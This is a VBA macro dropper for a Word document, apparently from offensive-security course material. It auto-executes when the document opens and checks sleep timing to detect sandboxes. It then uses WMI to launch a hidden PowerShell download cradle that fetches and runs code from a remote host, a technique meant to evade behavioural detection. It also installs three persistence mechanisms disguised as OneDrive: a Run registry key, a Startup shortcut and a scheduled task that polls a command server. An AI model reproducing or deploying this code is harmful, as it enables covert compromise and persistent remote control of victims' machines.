Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long

' Auto-execute entry points — fires when the document opens and the user
' clicks "Enable Content".
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim strArg As String
    Dim t1 As Date, t2 As Date, timeDelta As Long
    Dim pid As Long

    ' --- Emulator detection (Mod 11.6.1) ---
    ' AV heuristic emulators fast-forward through Sleep. If the wall clock
    ' did not advance by ~2 seconds, we are in a sandbox and bail.
    t1 = Now()
    Sleep (2000)
    t2 = Now()
    timeDelta = DateDiff("s", t1, t2)
    If timeDelta < 2 Then Exit Sub

    ' --- Stage 1: de-chained PowerShell download cradle via WMI (Mod 11.8.2) ---
    ' GetObject("winmgmts:") spawns PowerShell as a child of WmiPrvSE.exe,
    ' not of WINWORD.EXE. Behavioral detection that flags "Office spawning
    ' PowerShell" is bypassed.
    strArg = "powershell -exec bypass -nop -w hidden -c " & _
             "iex((new-object system.net.webclient)." & _
             "downloadstring('http://192.168.119.120/run.txt'))"
    GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid

    ' --- Stage 2: persistence (Mod 24.3) ---
    Call PersistRunKey
    Call PersistStartupLink
    Call PersistScheduledTask
End Sub

' ─── Persistence 1: HKCU Run key ───────────────────────────────────────────
' HKCU-scoped, no admin required, survives normal reboots. Value name
' "OneDriveSync" camouflages the entry in the Registry Editor.
Sub PersistRunKey()
    Dim cmd As String
    Dim sh As Object
    Set sh = CreateObject("WScript.Shell")
    cmd = "powershell -exec bypass -nop -w hidden -c " & _
          "iex((new-object system.net.webclient)." & _
          "downloadstring('http://192.168.119.120/run.txt'))"
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveSync", _
                 cmd, "REG_SZ"
End Sub

' ─── Persistence 2: Startup folder LNK ─────────────────────────────────────
Sub PersistStartupLink()
    Dim startup As String
    Dim sh As Object, lnk As Object
    startup = Environ("APPDATA") & _
              "\Microsoft\Windows\Start Menu\Programs\Startup\"
    Set sh = CreateObject("WScript.Shell")
    Set lnk = sh.CreateShortcut(startup & "OneDrive Sync.lnk")
    lnk.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    lnk.Arguments = "-exec bypass -nop -w hidden -c " & _
                    "iex((new-object system.net.webclient)." & _
                    "downloadstring('http://192.168.119.120/run.txt'))"
    lnk.WindowStyle = 7
    lnk.Description = "OneDrive Sync"
    lnk.Save
End Sub

' ─── Persistence 3: scheduled task (on-demand callback) ────────────────────
' Writes the poller to %APPDATA%\Microsoft\OneDrive\update.ps1 and registers
' a task that runs every 5 minutes. The task only fires a shell when the C2
' serves /activate with HTTP 200.
'
' IMPORTANT: The f.Write line below contains a placeholder. Replace it with
' the contents of shared/activate_poller.ps1 before saving as .docm. See
' BUILD.md Step 3c.
Sub PersistScheduledTask()
    Dim sh As Object
    Dim psPath As String, cmd As String
    Dim fso As Object, f As Object

    Set sh = CreateObject("WScript.Shell")
    Set fso = CreateObject("Scripting.FileSystemObject")

    psPath = Environ("APPDATA") & "\Microsoft\OneDrive\update.ps1"

    ' PLACEHOLDER — replace with contents of shared/activate_poller.ps1
    Set f = fso.CreateTextFile(psPath, True)
    f.Write "(poller body — see shared/activate_poller.ps1)"
    f.Close

    cmd = "schtasks /create /tn OneDriveUpdate /tr " & _
          """powershell -exec bypass -nop -w hidden -File " & psPath & """" & _
          " /sc minute /mo 5 /f"
    sh.Run cmd, 0, False
End Sub
